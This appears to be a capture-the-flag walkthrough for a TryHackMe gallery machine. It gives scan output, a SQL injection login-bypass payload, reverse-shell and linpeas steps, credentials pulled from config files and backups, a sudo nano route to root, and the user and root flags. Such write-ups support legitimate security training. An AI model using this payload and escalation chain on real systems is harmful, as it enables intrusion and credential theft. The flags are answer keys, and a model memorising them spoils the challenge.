ip address: 10.10.126.42

Nmap:
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: D06375CB55D4AE8566327310E3F847BE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System


run gobuster on $ip : -> found /gallery

run gobuster on $ip/gallery/:

/archives (Status: 301)
/user (Status: 301)
/uploads (Status: 301)
/assets (Status: 301)
/report (Status: 301)
/albums (Status: 301)
/plugins (Status: 301)
/database (Status: 301)
/classes (Status: 301)
/dist (Status: 301)
/inc (Status: 301)
/build (Status: 301)
/schedules (Status: 301)


Go to port 8080 and find Simple image gallery system

use searchsploit to find a rce for Simple image gallery

run the exploit

open exploit and try sql injection in the username field: admin' or 1=1-- -

upload a php reverse shell to get a foothold into the machine;

navigate to /var/www/html/ and cat the initialize.php file:

f(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");

connect to the db :
$ mysql -u gallery_user -p
show_databases;
use gallery_db;
show tables;
select * from users;

upload linpeas.sh to victims machine using a simple http server;

run linpeas on the target machine

go to /var/backups/mike_home_backup/documents/ and find the following:
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123

in /var/backups/mike_home_backup/.bash_history we find mike's password:
sudo -lb3stpassw0rdbr0xx

get user flag:
THM{af05cd30bfed67849befd546ef}


sudo -l 
use nano to get a revershe shell as root
root flag: THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}







